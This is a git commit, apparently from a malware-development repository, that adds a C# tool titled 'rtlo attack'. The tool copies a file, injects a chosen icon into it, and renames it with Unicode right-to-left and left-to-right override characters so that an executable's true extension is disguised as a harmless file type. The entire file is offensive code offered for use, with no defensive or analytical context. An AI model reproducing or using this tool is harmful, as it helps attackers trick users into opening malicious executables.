b14f7861e55c3e0c25ab18b1b966680d9347cab9
user <user@MALDEV>
2022-03-09 07:25:10 -0800

    rtlo attack init

---
+++ Program.cs
@@ -0,0 +1,52 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace rtlo_attack
+{
+    class Program
+    {
+        private static string Reverse(string text)
+        {
+            char[] charArray = text.ToCharArray();
+            Array.Reverse(charArray);
+            return new string(charArray);
+        }
+
+        static void Main(string[] args)
+        {
+            char ltro = '\u202d';
+            char rtlo = '\u202e';
+
+
+            if (args.Length < 2)
+            {
+                return;
+            }
+
+            string inputFile = args[0];
+            string iconFile = args[1];
+
+            string filenameWithExtension = inputFile.Split('\\').Last();
+            string extension = "." + filenameWithExtension.Split('.').Last();
+            string filename = filenameWithExtension.Substring(0, filenameWithExtension.Length - extension.Length);
+
+            string tempFilename = "temp" + extension;
+
+            File.Copy(inputFile, tempFilename);
+            IconChanger.InjectIcon(tempFilename, iconFile);
+
+            if (filename.Contains(extension))
+            {
+                string[] array = filename.Split(new string[] { extension }, StringSplitOptions.None);
+
+                string fileName = array[0] + rtlo + Reverse(array[1]) + ltro + extension;
+                File.Move("temp" + extension, fileName);
+            }
+
+        }
+    }
+}
